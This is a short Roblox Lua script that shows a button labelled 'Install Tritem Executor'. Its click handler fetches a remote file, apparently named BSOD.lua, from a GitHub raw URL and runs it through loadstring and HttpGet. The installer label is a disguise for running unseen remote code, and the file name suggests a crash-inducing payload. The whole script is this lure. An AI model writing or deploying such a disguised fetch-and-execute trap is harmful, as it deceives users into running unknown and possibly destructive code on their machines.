local gui = Instance.new('ScreenGui', game:service'CoreGui')
local button = Instance.new('TextButton', gui)

button.Size = UDim2.new(0, 200, 0, 100)
button.Position = UDim2.new(.5, 0, .5, 0)
button.Text = 'Install Tritem Executor'

button.MouseButton1Click:Connect(loadstring(game:HttpGet('https://raw.githubusercontent.com/Tritemis/BSOD/main/BSOD.lua'))
